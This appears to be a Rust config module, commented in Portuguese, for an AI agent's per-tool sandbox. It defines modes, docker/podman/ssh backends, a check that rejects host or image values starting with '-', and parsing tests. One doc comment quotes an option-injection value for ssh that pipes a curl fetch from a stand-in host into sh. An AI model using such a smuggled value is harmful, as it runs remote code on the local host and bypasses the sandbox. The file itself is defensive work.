//! Secao `agent.sandbox` (#1225): a config do sandbox por tool.
//!
//! Mora num modulo proprio, e nao no `model.rs`, por duas razoes. A
//! primeira e o ratchet de tamanho — o `model.rs` passou de 1500 linhas
//! quando esta secao entrou. A segunda importa mais: estes tipos tem
//! regras de validacao com consequencia de seguranca (um `ssh_host`
//! comecando com `-` vira **opcao** do `ssh`, nao host), e elas merecem
//! ficar ao lado do que descrevem em vez de diluidas entre trinta outras
//! secoes de config.
//!
//! O campo em si (`AgentConfig::sandbox`) continua no `model.rs`, onde
//! vive o resto de `agent.*`.

use serde::{Deserialize, Serialize};

fn default_true() -> bool {
    true
}

/// Um valor de config que ocupa posicao numa linha de comando e que o
/// programa alvo interpretaria como **opcao** se comecasse com `-`.
///
/// `sh_quote` produz um unico token, o que impede injecao de comando; nao
/// impede injecao de *opcao*. `ssh '-oProxyCommand=curl http://x|sh' --
/// sh -lc ...` continua sendo um token so, e o `ssh` o le como flag: o
/// comando roda no host **local**, sem passar pelo `safety_gate`, que e
/// exatamente o contrario do que o sandbox existe para fazer. O mesmo vale
/// para `image` no `docker run`, onde um token com `-` desloca o posicional.
///
/// A defesa e recusar o valor em vez de tentar escapa-lo: nenhum host de
/// verdade e nenhuma imagem de verdade comeca com `-`. Aplicada em tres
/// camadas: aqui (via `config check`, que **reporta** — comando opt-in, nao
/// gate de boot), na conversao do boot (`sandbox_policy_from`) e no proprio
/// `wrap_command`. As duas ultimas e que garantem a propriedade: rodam
/// sempre.
///
/// Gemeo em `garraia_agents::sandbox::parece_opcao` — mesma regra, do outro
/// lado da fronteira de crate, porque a `SandboxPolicy` tambem pode ser
/// montada sem passar por config nenhuma.
///
/// O conserto estrutural — montar argv em vez de uma linha de shell — e
/// acompanhamento na #1225 (slices S2/S3), como ja recomendado na #1231.
pub fn parece_opcao(valor: &str) -> bool {
    valor.trim_start().starts_with('-')
}

/// Tools que hoje consultam a `SandboxPolicy` — ou seja, as unicas que
/// `sandboxed_tools`/`elevated` conseguem afetar.
///
/// Espelho de `garraia-agents`: a policy e lida dentro do `BashTool` e em
/// nenhum outro lugar. `run_tests`, `git_diff`, `code_review` e
/// `repo_search` nascem no host mesmo com `mode: all`. Listar qualquer uma
/// delas aqui nao tem efeito, e o `config check` diz isso em vez de deixar
/// o operador acreditar que listou.
///
/// # Por que um espelho, e o que o prende
///
/// A alternativa seria `garraia-config` depender de `garraia-agents`, uma
/// aresta cara (agents arrasta db, security, hardware) para compartilhar uma
/// lista de uma palavra. Mas dessincronizar tem dano **direcional**: quando
/// a slice S2/S3 envolver `run_tests`, esquecer de atualizar esta const NAO
/// abre o sandbox — faz o `config check` emitir um Warning **ativamente
/// falso**, mandando o operador remover uma entrada que funciona. Conselho
/// errado num controle de seguranca e pior que conselho nenhum.
///
/// Por isso ha um teste em `garraia-gateway` (a unica crate que ve as duas)
/// que varre o fonte de `garraia-agents` e falha se esta lista divergir das
/// tools que de fato consultam a policy.
pub const TOOLS_SANDBOXAVEIS: &[&str] = &["bash"];

/// Modo de aplicacao do sandbox por tool (`agent.sandbox.mode`, #1225).
///
/// Espelha `garraia_agents::sandbox::SandboxMode`. Duplicado de proposito: a
/// crate de config nao depende da de agents (nem o contrario), e criar essa
/// aresta so para compartilhar um enum de tres variantes custaria mais do que
/// a duplicacao. A conversao vive onde os dois tipos sao visiveis
/// (`garraia_gateway::bootstrap::sandbox_policy_from`).
#[derive(Debug, Clone, Copy, Default, PartialEq, Eq, Serialize, Deserialize)]
#[serde(rename_all = "lowercase")]
pub enum SandboxMode {
    /// Tudo roda no host, como sempre (default).
    #[default]
    Off,
    /// Toda tool sandboxavel roda no backend, menos as listadas em `elevated`.
    All,
    /// Apenas as tools listadas em `sandboxed_tools` rodam no backend.
    Allowlist,
}

/// Backend de sandbox (`agent.sandbox.backend`, #1225).
///
/// Diferente de `garraia_agents::sandbox::SandboxBackend`, que carrega o host
/// dentro da variante `Ssh(String)`: em config o host e um campo irmao
/// (`ssh_host`), porque uma variante com payload em TOML/YAML exigiria
/// `backend = { ssh = "host" }` — forma que ninguem escreve a mao.
#[derive(Debug, Clone, Copy, PartialEq, Eq, Serialize, Deserialize)]
#[serde(rename_all = "lowercase")]
pub enum SandboxBackendKind {
    /// `docker run --rm ...` — precisa do binario `docker` no host.
    Docker,
    /// `podman run --rm ...` — precisa do binario `podman` (rootless).
    Podman,
    /// `ssh <ssh_host> -- ...`. **Nao e sandbox**: e execucao remota, que
    /// isola o host local e nada mais. O `config check` avisa sobre isso.
    Ssh,
}

/// Secao `agent.sandbox` (#1225).
///
/// Os campos espelham exatamente os de `garraia_agents::sandbox::SandboxPolicy`
/// — nenhum botao aqui promete algo que a policy nao saiba honrar. Duas
/// ressalvas que o `config check` repete ao operador:
///
/// - `network_disabled` e `mount_workdir` so valem para `docker`/`podman`; o
///   ramo `ssh` os ignora em silencio.
/// - `elevated` e escape hatch: a tool listada roda **no host**, fora do
///   backend. Sem `tool_confirmation_enabled` ela roda sem pedir nada.
#[derive(Debug, Clone, PartialEq, Eq, Serialize, Deserialize)]
pub struct SandboxConfig {
    /// `off` (default) | `all` | `allowlist`.
    #[serde(default)]
    pub mode: SandboxMode,
    /// `docker` | `podman` | `ssh`. Obrigatorio quando `mode != off` — sem ele
    /// o `wrap_command` falha fechado a cada comando, que e seguro mas inutil.
    #[serde(default)]
    pub backend: Option<SandboxBackendKind>,
    /// Imagem do container (`docker`/`podman`). Ausente => o default da policy
    /// (`debian:bookworm-slim`); o default nao e repetido aqui para as duas
    /// crates nao poderem discordar.
    #[serde(default)]
    pub image: Option<String>,
    /// Host do `ssh`, obrigatorio quando `backend = ssh`.
    #[serde(default)]
    pub ssh_host: Option<String>,
    /// Tools sandboxadas quando `mode = allowlist`. Hoje so `bash` e envolvida
    /// pela policy (#1225 acompanha as demais).
    #[serde(default)]
    pub sandboxed_tools: Vec<String>,
    /// Tools que escapam do sandbox mesmo em `mode = all` — rodam no host.
    #[serde(default)]
    pub elevated: Vec<String>,
    /// Monta o diretorio de trabalho dentro do container (rw) e usa como cwd.
    #[serde(default = "default_true")]
    pub mount_workdir: bool,
    /// Rede do container desligada. Default `true`.
    #[serde(default = "default_true")]
    pub network_disabled: bool,
}

impl Default for SandboxConfig {
    fn default() -> Self {
        Self {
            mode: SandboxMode::Off,
            backend: None,
            image: None,
            ssh_host: None,
            sandboxed_tools: Vec::new(),
            elevated: Vec::new(),
            mount_workdir: true,
            network_disabled: true,
        }
    }
}

#[cfg(test)]
mod tests {
    use crate::model::AppConfig;

    /// #1225: a secao `agent.sandbox` parseia do TOML e do YAML, e — o que
    /// mais importa para nao quebrar instalacao existente — a **ausencia** da
    /// secao produz exatamente o mesmo default que `SandboxPolicy::default()`
    /// em `garraia-agents`: `off`, sem backend, workdir montado, rede off.
    #[test]
    fn agent_sandbox_parses_from_toml_and_defaults_to_off() {
        use super::{SandboxBackendKind, SandboxMode};

        // Config que nunca ouviu falar de sandbox continua valida.
        let sem_secao: AppConfig =
            toml::from_str("[agent]\ntool_confirmation_enabled = true\n").expect("toml parses");
        let sb = &sem_secao.agent.sandbox;
        assert_eq!(sb.mode, SandboxMode::Off);
        assert_eq!(sb.backend, None);
        assert_eq!(sb.image, None);
        assert_eq!(sb.ssh_host, None);
        assert!(sb.sandboxed_tools.is_empty());
        assert!(sb.elevated.is_empty());
        assert!(sb.mount_workdir, "default historico da policy");
        assert!(sb.network_disabled, "default historico da policy");
        assert_eq!(sb, &super::SandboxConfig::default());

        // Secao presente mas vazia: os booleanos NAO viram false.
        let vazia: AppConfig = toml::from_str("[agent.sandbox]\n").expect("toml parses");
        assert_eq!(vazia.agent.sandbox, super::SandboxConfig::default());

        // Config completa do operador.
        let cheia: AppConfig = toml::from_str(
            r#"
[agent.sandbox]
mode = "allowlist"
backend = "podman"
image = "alpine:3.20"
sandboxed_tools = ["bash"]
elevated = ["web_fetch"]
mount_workdir = false
network_disabled = false
"#,
        )
        .expect("toml parses");
        let sb = &cheia.agent.sandbox;
        assert_eq!(sb.mode, SandboxMode::Allowlist);
        assert_eq!(sb.backend, Some(SandboxBackendKind::Podman));
        assert_eq!(sb.image.as_deref(), Some("alpine:3.20"));
        assert_eq!(sb.sandboxed_tools, vec!["bash".to_string()]);
        assert_eq!(sb.elevated, vec!["web_fetch".to_string()]);
        assert!(!sb.mount_workdir);
        assert!(!sb.network_disabled);

        // `ssh` traz o host num campo irmao, nao dentro da variante.
        let ssh: AppConfig = serde_yaml::from_str(
            "agent:\n  sandbox:\n    mode: all\n    backend: ssh\n    ssh_host: box.interno\n",
        )
        .expect("yaml parses");
        assert_eq!(ssh.agent.sandbox.mode, SandboxMode::All);
        assert_eq!(ssh.agent.sandbox.backend, Some(SandboxBackendKind::Ssh));
        assert_eq!(ssh.agent.sandbox.ssh_host.as_deref(), Some("box.interno"));
    }
}
